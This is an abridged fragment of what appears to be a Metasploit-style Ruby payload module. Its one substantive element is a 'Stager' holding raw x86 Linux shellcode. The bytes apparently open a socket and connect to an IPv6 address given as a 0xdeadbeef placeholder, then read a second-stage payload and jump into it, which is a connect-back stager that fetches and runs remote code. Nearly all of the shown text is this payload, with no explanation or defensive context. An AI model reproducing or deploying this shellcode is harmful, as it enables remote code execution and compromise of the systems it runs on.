	...
	def initialize(info = {})
		super(merge_info(info,
			...
			'Stager'      => {
					...
					'Payload' =>
						"\x31\xdb\x31\xc9\xb5\x20\xb2\x07\x6a\x22\x5e\x31\xc0\xb0\xc0\xcd" +
						"\x80\x94\xd1\xe9\x01\xcc\x53\x43\x53\x6a\x0a\x89\xe1\x6a\x66\x58" +
						"\xcd\x80\x96\x99\x68\x00\x00\x00\x00\x68\xde\xad\xbe\xef\x68\xde" +
						"\xad\xbe\xef\x68\xde\xad\xbe\xef\x68\xde\xad\xbe\xef\x52\x66\x68" +
						"\xbf\xbf\x66\x68\x0a\x00\x89\xe1\x6a\x1c\x51\x56\x89\xe1\x43\x43" +
						"\x6a\x66\x58\xcd\x80\x89\xf3\xb6\x0c\xb0\x03\xcd\x80\x89\xdf\xff" +
						"\xe1"
				}
			))
